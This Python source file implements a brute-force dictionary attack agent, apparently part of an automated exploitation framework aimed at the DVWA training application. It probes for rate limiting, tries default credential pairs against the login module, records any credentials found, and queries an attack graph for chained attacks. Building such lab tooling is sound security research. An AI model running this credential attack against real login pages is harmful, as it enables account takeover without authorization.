"""Brute Force Dictionary attack agent with real HTTP execution."""

from __future__ import annotations

import logging
import time as time_mod
from typing import Any

from agents.agent_telemetry import exploit_event, probe_event, score_event
from agents.state_utils import already_tried_payloads, make_update, normalize_security_level
from core.knowledge_graph import AttackKnowledgeGraph
from core.state import ExploitationState, MODULE_TO_KG_NODE
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier

logger = logging.getLogger(__name__)

AGENT_ID = "bf_dictionary"
MODULE_PATH = "/vulnerabilities/brute/"
_PROBE_OBSERVATION_KEY = "no_rate_limit"

_SUCCESS_SIGNALS = [
    "welcome to the password protected area",
    "password protected area",
]
_FAILURE_SIGNALS = [
    "username and/or password incorrect",
    "incorrect",
]
_CAPTCHA_SIGNALS = [
    "captcha",
    "recaptcha",
    "please enter the captcha",
]

_RATE_LIMIT_THRESHOLD = 2.0  # seconds for 3 rapid requests


def _probe_preconditions(
    session: DVWASession, payloads: list[str], already_tried: set[str]
) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
    """Send rapid requests to detect rate limiting.

    Returns (precondition_met, tried_payloads, observations, telemetry_events).
    """
    observations: dict[str, bool] = {}
    tried: list[str] = []
    events: list[dict] = []
    sent_any = False

    probe_start = time_mod.monotonic()
    for i, _payload in enumerate(payloads):
        probe_key = f"rate_probe_{i}"
        if probe_key in already_tried:
            continue
        sent_any = True
        tried.append(probe_key)
        try:
            resp = session.get(
                MODULE_PATH,
                params={"username": "test", "password": "test", "Login": "Login"},
            )
            events.append(probe_event(AGENT_ID, probe_key, resp.status_code, True))
        except Exception as exc:
            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
            events.append(probe_event(AGENT_ID, probe_key, None, False))
    probe_elapsed = time_mod.monotonic() - probe_start

    if not sent_any:
        return True, tried, {}, events  # Assume no rate limit if already probed

    if probe_elapsed > _RATE_LIMIT_THRESHOLD:
        observations[_PROBE_OBSERVATION_KEY] = False
        return False, tried, observations, events

    observations[_PROBE_OBSERVATION_KEY] = True
    return True, tried, observations, events


def _parse_credential(payload: str) -> tuple[str, str]:
    """Parse a 'username:password' payload string."""
    if ":" in payload:
        parts = payload.split(":", 1)
        return parts[0].strip(), parts[1].strip()
    return "", ""


def _attempt_exploit(
    session: DVWASession, payloads: list[str], already_tried: set[str],
    security_level: str,
) -> tuple[int, list[str], list[str], list[dict], list[dict[str, str]]]:
    """Try credential pairs. Returns (score, tried, confirmed, events, found_credentials)."""
    tried: list[str] = []
    events: list[dict] = []
    confirmed: list[str] = []
    found_credentials: list[dict[str, str]] = []
    score = 0
    verifier = Verifier()

    # Level-aware delay
    delay = 0.5 if security_level == "medium" else 0.0

    for payload in payloads:
        if payload in already_tried:
            continue
        tried.append(payload)
        username, password = _parse_credential(payload)
        if not username:
            continue

        try:
            resp = session.get(
                MODULE_PATH,
                params={"username": username, "password": password, "Login": "Login"},
            )
            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))

            # Check for CAPTCHA (out of scope)
            captcha_result = verifier.contains_any(resp.text, _CAPTCHA_SIGNALS)
            if captcha_result.ok:
                score = max(score, 1)
                break

            # Full exploit: successful login
            success_result = verifier.contains_any(resp.text, _SUCCESS_SIGNALS)
            if success_result.ok:
                score = max(score, 3)
                confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
                found_credentials.append({"username": username, "password": password})
                break

            # Check for explicit failure
            failure_result = verifier.contains_any(resp.text, _FAILURE_SIGNALS)
            if not failure_result.ok and resp.status_code == 200:
                # Ambiguous response - no clear signal either way
                pass
        except Exception as exc:
            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
            events.append(exploit_event(AGENT_ID, payload, None, False))

        if delay:
            time_mod.sleep(delay)

    return score, tried, confirmed, events, found_credentials


def _chain_check(confirmed_node: str, state: ExploitationState) -> tuple[int, list[str]]:
    """Query AKG for chain edges. Returns (score, achieved_outcomes)."""
    achieved: list[str] = []
    score = 0
    kg = AttackKnowledgeGraph()
    confirmed_set = set(state.get("confirmed_vulns", [])) | {confirmed_node}

    for edge in kg.get_next_actions(confirmed_node):
        if not edge.get("is_chain"):
            continue
        preconditions = edge.get("preconditions", [])
        if all(p in confirmed_set for p in preconditions):
            achieved.append(edge["target"])
            score = 4

    return score, achieved


def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
    """Run PROBE -> EXPLOIT -> CHAIN CHECK for bf_dictionary."""
    target_url = state.get("target_url", "")
    security_level = normalize_security_level(state.get("security_level"))

    if not target_url:
        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])

    session = DVWASession(target_url)
    try:
        if not session.login():
            return make_update(
                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
                failure_agents=[AGENT_ID],
            )
        session.set_security_level(security_level)

        payload_lib = PayloadLibrary()
        payload_set = payload_lib.get(AGENT_ID, security_level)

        already_tried = already_tried_payloads(state, AGENT_ID)
        confirmed_vulns: list[str] = []
        achieved_outcomes: list[str] = []
        found_credentials: list[dict[str, str]] = []
        score = 0
        telemetry_events: list[dict[str, Any]] = []
        all_tried: list[str] = []
        observations: dict[str, bool] = {}

        # Stage 1: PROBE
        probe_payloads = list(payload_set.probe) or ["admin:password", "admin:admin"]
        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
            session, probe_payloads, already_tried
        )
        all_tried.extend(tried)
        telemetry_events.extend(probe_events)
        observations.update(probe_obs)

        if not probe_ok:
            update = make_update(
                state=state, module_name=AGENT_ID, score=0,
                tried_payloads=all_tried, telemetry_events=telemetry_events,
            )
            update["observations"] = observations
            return update

        score = max(score, 1)

        # Stage 2: EXPLOIT
        exploit_payloads = list(payload_set.exploit) or [
            "admin:password", "gordonb:abc123", "pablo:letmein", "smithy:password"
        ]
        bypass_payloads = list(payload_set.bypass.get(security_level, []))
        all_exploit = exploit_payloads + bypass_payloads

        exploit_score, tried, confirmed, exploit_events, creds = _attempt_exploit(
            session, all_exploit, already_tried | set(all_tried), security_level,
        )
        all_tried.extend(tried)
        telemetry_events.extend(exploit_events)
        score = max(score, exploit_score)
        confirmed_vulns.extend(confirmed)
        found_credentials.extend(creds)

        # Stage 3: CHAIN CHECK
        if confirmed_vulns:
            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
            if chain_score >= 4:
                score = max(score, chain_score)
                achieved_outcomes.extend(chain_achieved)

        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))

        update = make_update(
            state=state, module_name=AGENT_ID, score=score,
            tried_payloads=all_tried,
            confirmed_vulns=confirmed_vulns or None,
            achieved_outcomes=achieved_outcomes or None,
            found_credentials=found_credentials or None,
            telemetry_events=telemetry_events,
        )
        update["observations"] = observations
        return update
    except Exception as exc:
        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
        return make_update(
            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
            failure_agents=[AGENT_ID],
        )
    finally:
        session.close()
